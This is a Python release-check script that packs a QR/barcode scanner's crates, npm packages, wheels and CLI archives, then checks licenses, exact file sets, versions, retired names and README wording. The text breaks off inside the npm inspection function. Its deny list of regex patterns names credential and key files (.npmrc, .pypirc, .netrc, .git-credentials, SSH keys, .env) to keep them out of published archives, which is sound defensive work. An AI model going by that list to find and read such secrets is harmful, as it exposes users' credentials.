#!/usr/bin/env python3
"""Pack what every publish job would ship, then inspect the archives themselves.

Each target is packed or built locally the way its publish job does it, and
the resulting archive is read back: the AGPL LICENSE text (byte-identical to
the root copy, where PEP 639 says it is for Python), the README, the type
files, the version strings, the file set, and the absence of private or stray
files. The file set is exact for npm packages and wheels (a Linux wheel may
add the libraries auditwheel grafts, listed in RECORD); a .crate or an sdist
may only hold files git tracks in the directories it packs, plus what cargo
and maturin generate. A tar member that is not a regular file or a directory
fails. The npm main package ships the committed loader, JavaScript and
manifest (napi adds only the pins) and no install-time script; the wasm and
platform packages carry no scripts at all. The wasm package's destination
modules are also read statically: the core imports nothing and uses none of
the refused syntax or APIs past its browser floor; the Node resolver loads
only node:http, node:https, node:dns and the core, reads no environment
variables, and keeps certificate checks on. Nothing is ever uploaded: packing
goes through `cargo package`, `npm pack --pack-destination`,
scripts/build-wasm.sh (wasm-pack), maturin and `pub publish --dry-run`.
pypi-live alone reads the network: one GET of PyPI's public JSON for the
workspace version, no credential.

Every archive is held to this release's package names. A crate, npm package,
pinned platform package, addon, wheel, sdist, metadata name, Python module,
SBOM, WASM file, build record or CLI release file that still uses a name
retired at 0.11.0 (qrcode-ai-scanner…, qrcode_ai_scanner…, @supernovae-st/…)
fails, and so does, with --release-set, a Flutter package not named
qr_barcode_scanner. The main npm package's loader looks up, for each committed
napi target, its addon file, its platform package and that package's
package.json exactly once; its other lookups are napi's helpers (node:fs,
child_process, its own package.json) and branches for targets never built,
under the same names, and none names a retired package, WebAssembly or WASI.
An archive README carries at most its one previous-name sentence
(PREVIOUS_NAMES), links the migration guide only from PyPI, and states no
availability (pending publication, not yet published, coming soon); the
Flutter README is held to that last rule only with --release-set.
Directories kept their old names, so no check scans raw bytes for a name.

  package-inspect.py all [--no-build]          every target this host can run
  package-inspect.py crates [--verify]         the .crate of each published crate
  package-inspect.py node [--platform-dirs D]  the main npm tarball (+ platform packages)
  package-inspect.py wasm [--no-build]         the wasm npm tarball (builds pkg/ first)
  package-inspect.py python                    wheel + sdist through maturin
  package-inspect.py flutter --package-root D the staged pub.dev package
  package-inspect.py archive FILE...           already-built .crate · .tgz · .whl · .tar.gz · CLI release files
  package-inspect.py pypi-live FILE...         wheels + sdist against what PyPI already serves at this version
  package-inspect.py licenses [--sync]         every LICENSE copy against the root text
  package-inspect.py profiles [--nightly TC]   effective release profile per build root
  package-inspect.py versions [--tag vX.Y.Z]   publish-surface versions (+ the release tag)
  package-inspect.py selftest                  synthetic archives, one defect each: all must fail

Common options: --out DIR (JSON + Markdown receipt and command logs; the
Markdown also lands in $GITHUB_STEP_SUMMARY when that is set) · --strict
(UNAVAILABLE fails too: CI, where every tool must exist) · --cargo-wrapper
PATH (run cargo as `PATH cargo ...`) · --allow-dirty (passed to cargo) ·
--release-set (node · archive: the set about to publish, complete and
nothing else — npm: the main package pins every napi target and each pin has
its platform package; Python: one wheel per row of python.yml's wheels
matrix and one sdist) · --record FILE (archive: once nothing failed, one
`<sha256>  <file>` line per archive given, in sha256sum's format, so a later
step can prove it holds the very bytes inspected; removed when anything
failed; flutter records each published file instead).

CLI release files (archive): qrcode-barcode-scanner-cli-<version>-<triple>.tar.gz
(.zip for Windows), the -source.tar.gz git archive and the -SHA256SUMS over
them. Each archive holds exactly one top directory of license copies, the
generated SOURCE.md, THIRD-PARTY-LICENSES.txt and build-info.json, and qrscan,
in the one writer's layout (bytewise order, owner 0, the build's time, modes by
policy); build-info is held to the checkout's Cargo.lock, release profile and
toolchain pin, and no text member may name a build host. They need --commit ID
(the full commit they were built from); the source archive also --source-tree
DIR (a checkout holding that commit), whose git tree it must match file for
file. --tag T, --sums-sha256 H (SHA256SUMS must hash to H) and --forbid S (a
string no text member may hold, never echoed; repeatable) are optional.
--release-set: the five archives, the source archive and SHA256SUMS, from one
commit and toolchain, and nothing else.

Verdicts: PASS · FAIL · UNAVAILABLE (a tool or input this host lacks, named,
never a pass) · BLOCKED (a known structural blocker that packaging metadata
cannot fix). Exit 0 when nothing failed (under --strict, also nothing
unavailable) · 1 otherwise · 2 usage. Stdlib only, Python >= 3.11.
"""

import argparse
import bisect
import contextlib
import dataclasses
import datetime
import email.parser
import functools
import gzip
import hashlib
import html.parser
import importlib.util
import io
import json
import os
import pathlib
import posixpath
import re
import shlex
import shutil
import subprocess
import sys
import tarfile
import tempfile
import urllib.error
import urllib.request
import warnings
import zipfile
import zlib

try:
    import tomllib
except ModuleNotFoundError:  # Python < 3.11
    print("package-inspect.py needs Python >= 3.11 (tomllib)", file=sys.stderr)
    sys.exit(2)

ROOT = pathlib.Path(__file__).resolve().parent.parent
LICENSE = ROOT / "LICENSE"
CANON_TYPES = ROOT / "bindings" / "report-types.d.ts"
NODE_DIR = ROOT / "crates" / "qrcode-ai-scanner-node"
WASM_DIR = ROOT / "crates" / "qrcode-ai-scanner-wasm"
PY_DIR = ROOT / "crates" / "qrcode-ai-scanner-py"
FLUTTER_DIR = ROOT / "bindings" / "flutter"
SPDX = "AGPL-3.0-or-later"

# Every package root whose archive must carry the AGPL text. Each registry
# packs from its own directory, so the root LICENSE never reaches an archive
# by itself: none of the 0.9.0 archives held one.
LICENSE_COPIES = (
    "crates/qrcode-ai-scanner/LICENSE",
    "crates/qrcode-ai-scanner-cli/LICENSE",
    "crates/qrcode-ai-scanner-node/LICENSE",
    "crates/qrcode-ai-scanner-wasm/LICENSE",
    "crates/qrcode-ai-scanner-py/LICENSE",
    "bindings/flutter/LICENSE",
)

PUBLISHED_CRATES = ("qrcode-barcode-scanner", "qrcode-barcode-scanner-cli")
# The directory each published crate packs from: the directories kept their
# 0.10 names, so a crate's directory is never derived from its name.
CRATE_DIRS = {"qrcode-barcode-scanner": "crates/qrcode-ai-scanner",
              "qrcode-barcode-scanner-cli": "crates/qrcode-ai-scanner-cli"}
NODE_NAME = "@qrcode-ai-com/qrcode-barcode-scanner"
# napi.binaryName: each addon is <NODE_BINARY>.<platform suffix>.node.
NODE_BINARY = "qrcode-barcode-scanner"
WASM_NAME = "@qrcode-ai-com/qrcode-barcode-scanner-wasm"
# The one WebAssembly module and its JavaScript glue (wasm-pack --out-name).
WASM_STEM = "qrcode-barcode-scanner"
WASM_MODULE = f"{WASM_STEM}_bg.wasm"
PYPI_NAME = "qrcode-barcode-scanner"
FLUTTER_NAME = "qr_barcode_scanner"
# Names retired at 0.11.0, refused in every identity position: crate and npm
# names, pins, addon and WASM file names, Python distribution, module, file and
# SBOM names, the CLI release files' prefix and, with --release-set, the
# Flutter package name.
RETIRED_STEM = "qrcode-ai-scanner"
RETIRED_MODULE = "qrcode_ai_scanner"
RETIRED_SCOPE = "@supernovae-st/"
# Every file PyPI serves at one version, with its sha256 (a 404: no such
# version). pypi-live reads it; twine's --skip-existing compares names only.
PYPI_JSON = "https://pypi.org/pypi/{project}/{version}/json"

# Exact npm file sets: the `files` allowlist plus what npm always adds
# (package.json · README · LICENSE). Anything else is a stray.
NODE_FILES = frozenset({
    "LICENSE", "README.md", "package.json",
    "index.js", "index.d.ts", "native.js", "native.d.ts", "report-types.d.ts",
})
# The examples ship inside the wasm package, so the installed folder runs them: the image and
# camera pages under any static server, their shared worker, and the server-rendering script
# under Node. scripts/patch-wasm-pkg.mjs lists each file (never the folder) and copies it
# verbatim; nothing else may sit under examples/.
WASM_EXAMPLE_FILES = ("examples/README.md", "examples/camera.html", "examples/camera.js", "examples/headless.html",
                      "examples/headless.js", "examples/scanner.worker.js", "examples/ssr.mjs")
WASM_FILES = frozenset({
    "LICENSE", "README.md", "package.json",
    "LICENSE-APACHE-2.0", "THIRD-PARTY.md",
    f"{WASM_STEM}.js", f"{WASM_STEM}.d.ts", WASM_MODULE,
    "report-types.d.ts",
    "camera.js", "camera.d.ts", "camera-overlay.js", "camera-overlay.d.ts",
    "destination.js", "destination.d.ts", "destination-node.js", "destination-node.d.ts",
    "auto.js", "auto.d.ts", "build-info.json",
    *WASM_EXAMPLE_FILES,
})
# The keys wasm-pack 0.13.1 writes and scripts/patch-wasm-pkg.mjs renames or
# adds; a wasm package.json may carry no other key. A `dependencies` or a
# `publishConfig` is planted — nothing here writes one, and some would run or
# redirect on a consumer's install.
WASM_MANIFEST_KEYS = frozenset({
    "name", "type", "collaborators", "description", "version", "license", "homepage", "repository",
    "files", "main", "types", "sideEffects", "keywords", "module", "exports",
})
# What `napi create-npm-dirs` (@napi-rs/cli 3.7.3) picks from the main manifest
# into each platform package.json besides name/version/main/files/cpu/os/libc;
# their values are the main manifest's.
NAPI_CARRIED = ("description", "keywords", "author", "authors", "homepage", "license", "engines", "repository",
                "bugs")

# Never in a published archive, whatever its kind; matched case-insensitively
# (Credentials.json leaks as surely as credentials.json). Defence in depth:
# each archive is also held to an exact set or to the files git tracks.
STRAY = tuple((re.compile(pattern, re.IGNORECASE), why) for pattern, why in (
    (r"(^|/)plans/", "planning docs"),
    (r"(^|/)\.env($|\.)|\.env$|(^|/)\.envrc$", "environment file"),
    (r"\.(pem|key|p12|pfx|p8|jks|keystore|gpg|pgp|ppk|kdbx)$", "key material or keystore"),
    (r"(^|/)id_(rsa|dsa|ecdsa|ed25519)(\.pub)?$|(^|/)\.ssh/", "SSH key"),
    (r"(^|/)(\.npmrc|\.yarnrc(\.yml)?|\.pypirc|[._]netrc|\.git-credentials)$", "credentials file"),
    (r"(^|/)(credentials|secrets)[^/]*$", "credentials"),
    (r"(^|/)(target|node_modules|\.dart_tool|__pycache__|mutants\.out[^/]*)/", "build output"),
    (r"(^|/)\.git(/|$)", "git metadata"),
    (r"(^|/)\.(vscode|idea|claude|cursor|codex|aider[^/]*|windsurf|zed|fleet)/", "editor or agent directory"),
    (r"(^|/)(\.DS_Store|Thumbs\.db)$", "OS junk"),
    (r"(\.swp|\.swo|~)$", "editor junk"),
    (r"\.(crate|whl|tgz|zip|tar|gz|bz2|xz|zst|7z|rar|jar|aar|apk|ipa)$", "nested archive"),
))

# What cargo writes into a .crate besides the package's own tracked files.
CARGO_GENERATED = frozenset({".cargo_vcs_info.json", "Cargo.toml.orig", "Cargo.lock"})
# What maturin writes at the sdist root besides the PEP 639 license files.
MATURIN_SDIST_ROOT = frozenset({"PKG-INFO", "pyproject.toml", "README.md"})
# Explicit source copies at the relocated project root, never generated files.
MATURIN_SDIST_TYPING = frozenset({"qrcode_barcode_scanner.pyi", "py.typed"})
# The sdist packs the binding crate and its path dependency side by side, each
# under its directory's name (kept from 0.10), not its package name.
SDIST_CRATES = {"qrcode-ai-scanner-py/": "crates/qrcode-ai-scanner-py",
                "qrcode-ai-scanner/": "crates/qrcode-ai-scanner"}
# Besides the PEP 639 license files, what maturin generates or rewrites in the
# sdist rather than copying from the checkout: the root metadata, and the two
# Cargo.toml it rewrites (manifest-path/readme added, workspace keys inlined).
# Every other packed file must be the checkout's, byte for byte.
MATURIN_SDIST_GENERATED = MATURIN_SDIST_ROOT | {"qrcode-ai-scanner-py/Cargo.toml", "qrcode-ai-scanner/Cargo.toml"}
# The Python import package, and the __init__.py maturin writes for a pure-pyo3
# module with no python-source dir (binding_generator/pyo3_binding.rs, verbatim;
# no trailing newline). The .pyi stub and py.typed it emits are the checkout's.
PY_MODULE = "qrcode_barcode_scanner"
# The Rust SBOM maturin writes into every wheel (CycloneDX, through
# cargo-cyclonedx): its file and its root component are both named after the
# binding's Cargo package, which 0.10 called qrcode-ai-scanner-py.
PY_SBOM_ROOT = "qrcode-barcode-scanner-py"
PY_SBOM = f"sboms/{PY_SBOM_ROOT}.cyclonedx.json"
MATURIN_INIT_PY = (f"from .{PY_MODULE} import *\n\n__doc__ = {PY_MODULE}.__doc__\n"
                   f'if hasattr({PY_MODULE}, "__all__"):\n    __all__ = {PY_MODULE}.__all__').encode()

# A literal semver in the napi loader's version check: the 0.9.0 loader
# compared every platform package against '0.8.1'.
LOADER_LITERAL = re.compile(r"!== '\d+\.\d+\.\d+'|expected \d+\.\d+\.\d+ but got")
LOADER_RUNTIME_READ = "require('./package.json')"
# The lifecycle scripts npm runs on a consumer's install (prepare: from git).
INSTALL_SCRIPTS = frozenset({"preinstall", "install", "postinstall", "prepare"})

# python.yml › wheels builds one wheel per row of its matrix; PyPI receives
# exactly one wheel per row (each of its platform tags in that row's family)
# and the sdist. A row added there is added here, or the release fails.
WHEEL_PLATFORMS = (
    ("manylinux x86_64", re.compile(r"manylinux(_\d+_\d+|\d+)_x86_64")),
    ("manylinux aarch64", re.compile(r"manylinux(_\d+_\d+|\d+)_aarch64")),
    ("musllinux x86_64", re.compile(r"musllinux_\d+_\d+_x86_64")),
    ("macOS x86_64", re.compile(r"macosx_\d+_\d+_x86_64")),
    ("macOS arm64", re.compile(r"macosx_\d+_\d+_arm64")),
    ("Windows x64", re.compile(r"win_amd64")),
)
# What auditwheel grafts into a manylinux / musllinux wheel: the shared
# libraries the extension links against, renamed with a hash of their bytes
# (the musllinux wheel carries libgcc_s-<hash>.so.1).
GRAFTED_LIB = re.compile(r"qrcode_barcode_scanner\.libs/[^/]+-[0-9a-f]{8}\.so(\.\d+)*")

# What an archive README may say about its package's previous name: at most the
# one sentence of this table, true whenever it is read. A package or file
# missing from it names none: the platform packages (napi writes their README),
# the WASM examples README, and the Flutter package and the CLI release files,
# which were never published under another name. Registries render their own
# install lines and these files are frozen into archives before publication,
# so a README states no availability either.
PREVIOUS_NAMES = {
    ("crate", "qrcode-barcode-scanner"): "Releases up to 0.10.1 were published as `qrcode-ai-scanner`.",
    ("crate", "qrcode-barcode-scanner-cli"):
        "Releases up to 0.10.1 were published as `qrcode-ai-scanner-cli`; both install `qrscan`.",
    ("npm", NODE_NAME): "Releases up to 0.10.1 were published as `@supernovae-st/qrcode-ai-scanner`.",
    ("npm", WASM_NAME): "Releases up to 0.10.1 were published as `@supernovae-st/qrcode-ai-scanner-wasm`.",
    ("pypi", PYPI_NAME): "Releases up to 0.9.0 were published as `qrcode-ai-scanner`.",
}
# A sentence about a previous name, in its usual phrasings: published, released
# or shipped as or under; releases up to; formerly; previously named, called,
# known or published; renamed; used to be; an old, previous, former, earlier or
# prior name.
PREVIOUS_NAME_CLAIM = re.compile(r"\b(?:published|released|shipped) (?:as|under)\b|\breleases? up to\b|\bformerly\b"
                                 r"|\bpreviously (?:named|called|known|published)\b|\brenamed\b|\bused to be\b"
                                 r"|\b(?:old|previous|former|earlier|prior) names?\b", re.IGNORECASE)
# Availability text. "pending" is refused where it states a publication, not as
# the word for an unsettled promise ("a start() still pending rejects").
PENDING_TEXT = re.compile(r"\bnot yet (?:published|released|available|on (?:npm|PyPI|crates\.io|pub\.dev))\b"
                          r"|\bcoming soon\b|\bpending (?:publication|release|upload)\b"
                          r"|\bpending on (?:npm|PyPI|crates\.io|pub\.dev)\b"
                          r"|\b(?:publication|release|upload) (?:is |still )?pending\b", re.IGNORECASE)
# The migration guide, which the PyPI README alone links (its prose steps need it).
MIGRATION_GUIDE = "docs/guides/migrate-to-qrcode-barcode-scanner"

PASS, FAIL, UNAVAILABLE, BLOCKED = "pass", "fail", "unavailable", "blocked"


@dataclasses.dataclass
class Check:
    name: str
    ok: bool
    detail: str = ""


@dataclasses.dataclass
class Artifact:
    name: str
    kind: str
    path: str = ""
    sha256: str = ""
    size: int = 0
    listing: list = dataclasses.field(default_factory=list)
    checks: list = dataclasses.field(default_factory=list)
    notes: list = dataclasses.field(default_factory=list)
    reason: str = ""
    forced: str = ""  # UNAVAILABLE or BLOCKED, set explicitly
    package: dict = dataclasses.field(default_factory=dict)  # npm: name · version · optionalDependencies

    def check(self, name: str, ok: bool, detail: str = "") -> bool:
        self.checks.append(Check(name, bool(ok), detail))
        return bool(ok)

    def unavailable(self, reason: str) -> "Artifact":
        self.forced, self.reason = UNAVAILABLE, reason
        return self

    def blocked(self, reason: str) -> "Artifact":
        self.forced, self.reason = BLOCKED, reason
        return self

    @property
    def status(self) -> str:
        if any(not c.ok for c in self.checks):
            return FAIL
        return self.forced or PASS


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def rel(path: pathlib.Path) -> str:
    try:
        return str(path.resolve().relative_to(ROOT))
    except ValueError:
        return str(path)


def workspace_version() -> str:
    manifest = tomllib.loads((ROOT / "Cargo.toml").read_text())
    return manifest["workspace"]["package"]["version"]


class Host:
    """Command runner + receipt sink for one invocation."""

    def __init__(self, args):
        self.args = args
        self.cargo = [args.cargo_wrapper, "cargo"] if args.cargo_wrapper else ["cargo"]
        self.out = pathlib.Path(args.out).resolve() if args.out else None
        self.scratch = pathlib.Path(tempfile.mkdtemp(prefix="package-inspect-"))
        self.artifacts: list[Artifact] = []
        self.version = workspace_version()
        self.opener = urllib.request.urlopen  # pypi-live's one GET; the self-test answers it from fixtures
        self.recorded: list = []  # archive: (sha256, file as given) of each archive inspected, for --record
        if self.out:
            (self.out / "logs").mkdir(parents=True, exist_ok=True)

    def add(self, art: Artifact) -> Artifact:
        self.artifacts.append(art)
        return art

    def run(self, label: str, cmd: list, cwd: pathlib.Path = ROOT, timeout: int = 3600):
        """Run a command, keep its full output as a log, return the process."""
        try:
            proc = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True, timeout=timeout)
        except FileNotFoundError as err:
            proc = subprocess.CompletedProcess(cmd, 127, "", f"{err}\n")
        except subprocess.TimeoutExpired as err:
            proc = subprocess.CompletedProcess(cmd, 124, err.stdout or "", f"timed out after {timeout} s\n")
        if self.out:
            safe = re.sub(r"[^A-Za-z0-9._-]+", "-", label).strip("-")
            body = (
                f"$ (cd {rel(cwd)} && {shlex.join(str(c) for c in cmd)})\n"
                f"exit {proc.returncode}\n--- stdout\n{proc.stdout}\n--- stderr\n{proc.stderr}"
            )
            (self.out / "logs" / f"{safe}.log").write_text(body, encoding="utf-8")
        return proc

    def cargo_cmd(self, *args: str) -> list:
        return [*self.cargo, *args]

    def target_dir(self) -> pathlib.Path:
        proc = self.run("cargo-metadata", self.cargo_cmd("metadata", "--format-version", "1", "--no-deps"))
        if proc.returncode != 0:
            raise RuntimeError(f"cargo metadata failed: {tail(proc)}")
        return pathlib.Path(json.loads(proc.stdout)["target_directory"])


def tail(proc, lines: int = 12) -> str:
    text = (proc.stderr or "") + (proc.stdout or "")
    return " ⏎ ".join(text.strip().splitlines()[-lines:])


def which(tool: str):
    return shutil.which(tool)


# ---------------------------------------------------------------- archives


_TAR_KINDS = {tarfile.SYMTYPE: "symlink", tarfile.LNKTYPE: "hard link", tarfile.CHRTYPE: "character device",
              tarfile.BLKTYPE: "block device", tarfile.FIFOTYPE: "FIFO"}


def _tar_anomalies(path: pathlib.Path, members: list, raw: bytes = None) -> list:
    """Ways the archive's bytes differ from the single clean tar stream npm's
    node-tar (the consumer's extractor, and `npm publish <tgz>`'s manifest read)
    reads past but Python's default tarfile parse does not: a member that only a
    lenient (ignore_zeros) parse lists — after an all-zero block or a
    bad-checksum block, both of which stop the default parse — any non-NUL byte
    after the last member's data, and a duplicate member name (last wins for
    both readers, but it is never legitimate here). RAW: the tar already
    unpacked from PATH (CLI files read their one gzip member themselves)."""
    raw = path.read_bytes() if raw is None else raw
    if raw[:2] == b"\x1f\x8b":
        raw = gzip.decompress(raw)
    problems = []
    try:
        with tarfile.open(fileobj=io.BytesIO(raw), ignore_zeros=True) as lenient:
            lenient_names = [m.name for m in lenient.getmembers()]
    except tarfile.TarError as err:
        return [f"the archive does not parse cleanly even leniently: {err}"]
    names = [m.name for m in members]
    if lenient_names != names:
        problems.append(f"{len(lenient_names) - len(names)} member(s) only a lenient parse lists "
                        "(a member after an all-zero or bad-checksum block)")
    if members:
        last = members[-1]
        end = last.offset_data + last.size + (-last.size % 512)
        if not set(raw[end:]) <= {0}:
            problems.append("non-NUL byte(s) after the last member's data")
    dupes = sorted({name for name in names if names.count(name) > 1})
    if dupes:
        problems.append(f"duplicate member name(s): {', '.join(dupes)}")
    return problems


def read_tar(path: pathlib.Path):
    """A tar(.gz) archive → ({path below the top dir: bytes}, top dir, problems).

    Only regular files reach the dict. PROBLEMS collects every reason the
    archive is not a single clean tar of regular files and directories:
    - a member that is neither a regular file nor a directory (a symlink, a
      hard link, a device, a FIFO) — no packer here writes one, and the
      file-set and stray checks would never see what it points to;
    - a tar-stream anomaly (see _tar_anomalies) that makes Python read fewer
      members than node-tar does, so an inspected tarball and the one a
      consumer installs would differ.
    """
    files, tops, special = {}, set(), []
    with tarfile.open(path) as archive:
        members = archive.getmembers()
        for member in members:
            top, _, inner = member.name.partition("/")
            if member.isdir():
                continue
            tops.add(top)
            if not member.isfile():
                special.append(f"{inner or member.name} ({_TAR_KINDS.get(member.type, f'type {member.type!r}')})")
                continue
            handle = archive.extractfile(member)
            files[inner] = handle.read() if handle else b""
    special += _tar_anomalies(path, members)
    return files, (tops.pop() if len(tops) == 1 else "|".join(sorted(tops))), special


def check_members(art: Artifact, special: list) -> None:
    art.check("one clean tar of regular files and directories (no link, device or FIFO member; no member past "
              "an end-of-archive or bad block, no trailing data, no duplicate name)", not special,
              "; ".join(special))


def read_zip(path: pathlib.Path) -> dict:
    with zipfile.ZipFile(path) as archive:
        return {name: archive.read(name) for name in archive.namelist() if not name.endswith("/")}


def describe(art: Artifact, path: pathlib.Path, names) -> None:
    data = path.read_bytes()
    art.path, art.sha256, art.size = rel(path), sha256(data), len(data)
    art.listing = sorted(names)


def check_license(art: Artifact, data, where: str) -> None:
    want = sha256(LICENSE.read_bytes())
    if data is None:
        art.check("LICENSE present", False, f"no {where} in the archive")
        return
    got = sha256(data)
    art.check(
        "LICENSE is the AGPL text, byte-identical to the root LICENSE",
        got == want,
        f"{where} sha256 {got[:16]}…" + ("" if got == want else f" ≠ root {want[:16]}…"),
    )


def check_stray(art: Artifact, names) -> None:
    hits = [f"{name} ({why})" for name in names for pattern, why in STRAY if pattern.search(name)]
    art.check("no private or stray files", not hits, "; ".join(hits) if hits else "")


_TRACKED: dict = {}


def tracked(directory: str):
    """Files git tracks under DIRECTORY, relative to it; None when git cannot say."""
    if directory not in _TRACKED:
        proc = subprocess.run(["git", "ls-files", "-z", "--", directory], cwd=ROOT, capture_output=True)
        prefix = directory.rstrip("/") + "/"
        _TRACKED[directory] = None if proc.returncode else {
            name[len(prefix):] for name in proc.stdout.decode().split("\0") if name.startswith(prefix)}
    return _TRACKED[directory]


def check_tracked(art: Artifact, names, sources: dict, generated=frozenset()) -> None:
    """Every entry is a file git tracks in the directory it was packed from, or
    one the packager generates: an untracked file (picked up through
    --allow-dirty, or left in a build directory) never ships.

    SOURCES maps an archive prefix to the repository directory packed under it.
    """
    allowed = set(generated)
    for prefix, directory in sources.items():
        files = tracked(directory)
        if files is None:
            art.check("every file is tracked by git or generated by the packager", False,
                      f"git ls-files {directory} failed")
            return
        allowed |= {prefix + name for name in files}
    extra = sorted(set(names) - allowed)
    art.check("every file is tracked by git or generated by the packager", not extra,
              f"not tracked by git: {', '.join(extra)}" if extra else "")


def glob_regex(pattern: str) -> re.Pattern:
    """A PEP 639 license-files glob (`*`, `?`, `**`, `[...]`) as a full-match regex."""
    out, i = [], 0
    while i < len(pattern):
        if pattern.startswith("**/", i):
            out.append("(?:.*/)?")
            i += 3
        elif pattern.startswith("**", i):
            out.append(".*")
            i += 2
        elif pattern[i] in "*?":
            out.append("[^/]*" if pattern[i] == "*" else "[^/]")
            i += 1
        elif pattern[i] == "[" and "]" in pattern[i + 1:]:
            end = pattern.index("]", i + 1)
            out.append(pattern[i:end + 1])
            i = end + 1
        else:
            out.append(re.escape(pattern[i]))
            i += 1
    return re.compile("".join(out))


def check_exact_set(art: Artifact, names, expected: frozenset, what: str) -> None:
    names = set(names)
    extra, missing = sorted(names - expected), sorted(expected - names)
    detail = "; ".join(filter(None, [
        f"unexpected: {', '.join(extra)}" if extra else "",
        f"missing: {', '.join(missing)}" if missing else "",
    ]))
    art.check(f"file set is exactly the {what}", not extra and not missing, detail)


def check_equal_file(art: Artifact, name: str, data, source: pathlib.Path) -> None:
    want = source.read_bytes()
    art.check(f"{name} is {rel(source)} verbatim", data == want,
              "" if data == want else f"differs from {rel(source)}")


def readme_sentences(text: str) -> list:
    """The README's sentences, each on one line: paragraphs split at blank lines, then at a sentence end."""
    text = text.replace("\r\n", "\n").replace("\r", "\n")
    found = []
    for paragraph in re.split(r"\n[ \t]*\n", text):
        flat = " ".join(paragraph.split())
        found += [sentence for sentence in re.split(r"(?<=[.!?])\s+", flat) if sentence]
    return found


def availability_claims(data) -> list:
    """The availability phrases (PENDING_TEXT) of a README's bytes, each once."""
    return sorted({found.group(0) for found in PENDING_TEXT.finditer((data or b"").decode("utf-8", errors="replace"))})


def check_readme(art: Artifact, data, key: tuple, where: str = "README.md", pending: bool = True) -> None:
    """What an archive README says of names and availability: at most its one PREVIOUS_NAMES
    sentence (none for a package missing from the table), the migration guide linked only from
    PyPI, and, unless PENDING is False, no availability text."""
    text = (data or b"").decode("utf-8", errors="replace")
    want = PREVIOUS_NAMES.get(key)
    claims = [sentence for sentence in readme_sentences(text) if PREVIOUS_NAME_CLAIM.search(sentence)]
    art.check(f"{where} names a previous name only in its one sentence: {want}" if want else
              f"{where} names no previous name (the table lists no sentence for it)",
              claims in ([], [want]) if want else not claims, " · ".join(claims))
    if key != ("pypi", PYPI_NAME):
        art.check(f"{where} links no migration guide (the PyPI README alone does)", MIGRATION_GUIDE not in text)
    if pending:
        hits = availability_claims(data)
        art.check(f"{where} states no availability (pending publication, not yet published, coming soon)",
                  not hits, ", ".join(hits))


def retired_npm_name(name: str) -> bool:
    """NAME is, or derives from, an npm name retired at 0.11.0."""
    return name.startswith(RETIRED_SCOPE) or RETIRED_STEM in name


# ---------------------------------------------------------------- crates


def inspect_crate(host: Host, path: pathlib.Path, notes=()) -> Artifact:
    files, top, special = read_tar(path)
    art = host.add(Artifact(f"crate {top}", "crate"))
    art.notes.extend(notes)
    describe(art, path, files)
    check_members(art, special)
    manifest = tomllib.loads(files.get("Cargo.toml", b"").decode() or "")
    package = manifest.get("package", {})
    name = package.get("name") or top.rsplit("-", 1)[0]
    directory = CRATE_DIRS.get(name)
    art.check(f"crate is {' or '.join(PUBLISHED_CRATES)} (never a retired name)", directory is not None, name)
    art.check("file name is <name>-<version>.crate",
              path.name == f"{package.get('name')}-{package.get('version')}.crate", path.name)
    art.check("archive root is <name>-<version>", top == f"{package.get('name')}-{package.get('version')}", top)
    art.check(f"version = {host.version} (workspace)", package.get("version") == host.version,
              f"Cargo.toml version {package.get('version')}")
    art.check(f"license = {SPDX}", package.get("license") == SPDX, f"{package.get('license')}")
    for required in ("Cargo.toml", "Cargo.toml.orig", "README.md"):
        art.check(f"{required} present", required in files)
    entry = "src/main.rs" if name.endswith("-cli") else "src/lib.rs"
    art.check(f"{entry} present", entry in files)
    if name.endswith("-cli"):
        dep = manifest.get("dependencies", {}).get("qrcode-barcode-scanner", {})
        art.check(f"core dependency pinned at {host.version}", dep.get("version") == host.version,
                  f"qrcode-barcode-scanner version {dep.get('version')!r}")
    if directory is not None:
        readme = ROOT / directory / "README.md"
        if readme.is_file():
            check_equal_file(art, "README.md", files.get("README.md"), readme)
    check_readme(art, files.get("README.md"), ("crate", name))
    check_license(art, files.get("LICENSE"), "LICENSE")
    if directory is not None:
        check_tracked(art, files, {"": directory}, CARGO_GENERATED)
    check_stray(art, files)
    # Profiles never ride along from the workspace root: what `cargo install`
    # builds is whatever this manifest itself says.
    rxing = manifest.get("profile", {}).get("release", {}).get("package", {}).get("rxing", {})
    if name.endswith("-cli"):
        art.check("packaged CLI manifest keeps rxing overflow-checks", rxing.get("overflow-checks") is True,
                  f"profile.release.package.rxing = {rxing}")
    return art


def cmd_crates(host: Host) -> None:
    args = ["package", "--locked", *(f"-p{c}" for c in PUBLISHED_CRATES)]
    if not host.args.verify:
        args.append("--no-verify")
    if host.args.allow_dirty:
        args.append("--allow-dirty")
    proc = host.run("cargo-package", host.cargo_cmd(*args))
    try:
        target = host.target_dir()
    except RuntimeError as err:
        host.add(Artifact("crates", "crate")).check("cargo metadata", False, str(err))
        return
    mode = "packaged and verified (each crate built from its own archive)" if host.args.verify \
        else "packaged with --no-verify (crates-publish.yml verifies)"
    for crate in PUBLISHED_CRATES:
        path = target / "package" / f"{crate}-{host.version}.crate"
        if proc.returncode != 0 or not path.is_file():
            host.add(Artifact(f"crate {crate}-{host.version}", "crate")).check(
                "cargo package", False, f"exit {proc.returncode}: {tail(proc)}")
            continue
        inspect_crate(host, path, notes=[mode])


# ---------------------------------------------------------------- npm


def npm_pack(host: Host, label: str, pkg_dir: pathlib.Path):
    """`npm pack` into scratch, no lifecycle scripts → (tarball path, error)."""
    if not which("npm"):
        return None, "npm not on PATH"
    # Under --out the tarball stays next to the receipt that describes it.
    dest = (host.out / "archives" if host.out else host.scratch) / label
    dest.mkdir(parents=True, exist_ok=True)
    proc = host.run(f"npm-pack-{label}", ["npm", "pack", "--json", "--ignore-scripts",
                                          "--pack-destination", str(dest)], cwd=pkg_dir)
    if proc.returncode != 0:
        return None, f"npm pack exit {proc.returncode}: {tail(proc)}"
    try:
        meta = json.loads(proc.stdout)[0]
    except (ValueError, IndexError, KeyError) as err:
        return None, f"npm pack printed no JSON ({err})"
    return dest / meta["filename"], ""


def inspect_npm(host: Host, path: pathlib.Path, notes=()) -> Artifact:
    files, _top, special = read_tar(path)
    pkg = json.loads(files.get("package.json", b"{}"))
    name = pkg.get("name", "?")
    art = host.add(Artifact(f"npm {name}@{pkg.get('version')}", "npm"))
    art.notes.extend(notes)
    art.package = {key: pkg.get(key) for key in ("name", "version", "optionalDependencies")}
    describe(art, path, files)
    check_members(art, special)
    art.check(f"version = {host.version} (workspace)", pkg.get("version") == host.version,
              f"package.json version {pkg.get('version')}")
    art.check(f"license = {SPDX}", pkg.get("license") == SPDX, f"{pkg.get('license')}")
